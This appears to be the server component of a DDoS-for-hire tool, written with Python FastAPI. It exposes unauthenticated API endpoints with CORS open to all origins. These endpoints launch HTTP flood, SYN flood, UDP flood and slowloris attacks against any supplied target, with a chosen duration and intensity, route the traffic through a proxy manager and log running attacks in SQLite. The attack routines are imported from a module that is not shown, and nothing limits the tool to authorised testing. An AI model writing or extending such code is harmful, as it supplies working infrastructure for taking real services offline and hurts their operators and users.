from fastapi import FastAPI, HTTPException, Depends, BackgroundTasks, status
from fastapi.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager
import uvicorn
import os
import sqlite3
import time
from typing import Optional, Dict, List

from config import Config
from models import AttackRequest, AttackResponse, AttackStatus, Stats
from proxy_manager import ProxyManager
from attack_modules import AttackModules
from utils import parse_target

proxy_manager = ProxyManager(Config.PROXY_DIR, Config.PROXY_FILES)
attack_modules = AttackModules(proxy_manager)

@asynccontextmanager
async def lifespan(app: FastAPI):
    print("Iniciando server")
    yield
    print("Apagando server")

app = FastAPI(
    title="Server",
    version="1.0.0",
    lifespan=lifespan
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.post(f"{Config.API_PREFIX}/attack", response_model=AttackResponse)
async def launch_attack(
    attack_request: AttackRequest,
    background_tasks: BackgroundTasks
):
    
    if not attack_request.target.startswith(('http://', 'https://', '//')):
        attack_request.target = '//' + attack_request.target
    
    valid_attacks = ['http_flood', 'syn_flood', 'udp_flood', 'slowloris']
    if attack_request.attack_type not in valid_attacks:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Invalid attack type. Valid types: {valid_attacks}"
        )
    
    import uuid
    attack_id = str(uuid.uuid4())
    
    conn = sqlite3.connect('attacks.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS attacks
                     (attack_id TEXT, target TEXT, attack_type TEXT,
                      start_time REAL, duration INTEGER, intensity INTEGER, status TEXT)''')
    cursor.execute('''INSERT INTO attacks VALUES (?, ?, ?, ?, ?, ?, ?)''',
                 (attack_id, attack_request.target, 
                  attack_request.attack_type, time.time(), attack_request.duration,
                  attack_request.intensity, 'running'))
    conn.commit()
    conn.close()
    
    if attack_request.attack_type == 'http_flood':
        background_tasks.add_task(
            attack_modules.http_flood,
            attack_request.target,
            attack_request.duration,
            attack_request.intensity
        )
    elif attack_request.attack_type == 'syn_flood':
        target_ip, target_port = parse_target(attack_request.target)[1:]
        background_tasks.add_task(
            attack_modules.syn_flood,
            target_ip,
            target_port,
            attack_request.duration
        )
    elif attack_request.attack_type == 'udp_flood':
        target_ip, target_port = parse_target(attack_request.target)[1:]
        background_tasks.add_task(
            attack_modules.udp_flood,
            target_ip,
            target_port,
            attack_request.duration
        )
    elif attack_request.attack_type == 'slowloris':
        background_tasks.add_task(
            attack_modules.slowloris,
            attack_request.target,
            attack_request.duration
        )
    
    return AttackResponse(attack_id=attack_id, status="running")

@app.get(f"{Config.API_PREFIX}/attack/{{attack_id}}", response_model=AttackStatus)
async def get_attack_status(
    attack_id: str
):
    conn = sqlite3.connect('attacks.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM attacks WHERE attack_id=?", (attack_id,))
    attack = cursor.fetchone()
    conn.close()
    
    if not attack:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Attack not found"
        )
    
    return AttackStatus(
        attack_id=attack[0],
        type=attack[2],
        target=attack[1],
        start_time=attack[3],
        duration=attack[4],
        intensity=attack[5],
        status=attack[6]
    )

@app.get(f"{Config.API_PREFIX}/attacks", response_model=List[AttackStatus])
async def list_attacks():
    conn = sqlite3.connect('attacks.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM attacks")
    attacks = cursor.fetchall()
    conn.close()
    
    return [AttackStatus(
        attack_id=attack[0],
        type=attack[2],
        target=attack[1],
        start_time=attack[3],
        duration=attack[4],
        intensity=attack[5],
        status=attack[6]
    ) for attack in attacks]

@app.get(f"{Config.API_PREFIX}/stats", response_model=Stats)
async def get_stats():
    return Stats(
        active_attacks=len([a for a in get_attacks() if a[6] == 'running']),
        proxies=proxy_manager.get_stats()
    )

def get_attacks():
    conn = sqlite3.connect('attacks.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM attacks")
    attacks = cursor.fetchall()
    conn.close()
    return attacks

if __name__ == "__main__":
    uvicorn.run(
        app,
        host=Config.SERVER_HOST,
        port=Config.SERVER_PORT,
        workers=Config.WORKERS
    )